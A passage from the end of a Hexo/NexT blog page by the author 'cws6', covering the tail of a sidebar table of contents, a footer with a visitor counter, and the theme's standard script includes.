‘http://127.0.0.1:8085&#39;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">8.3.</span> <span class="nav-text">}</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cws6</span>

  

  
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

<!-- 
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>

-->


  <span class="post-meta-divider">|</span>


<!-- 
  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>

-->



        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  
    
      
  
  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>













  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>



  



  










  





  

  

  

  

  

  
  

  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

</body>
</html>
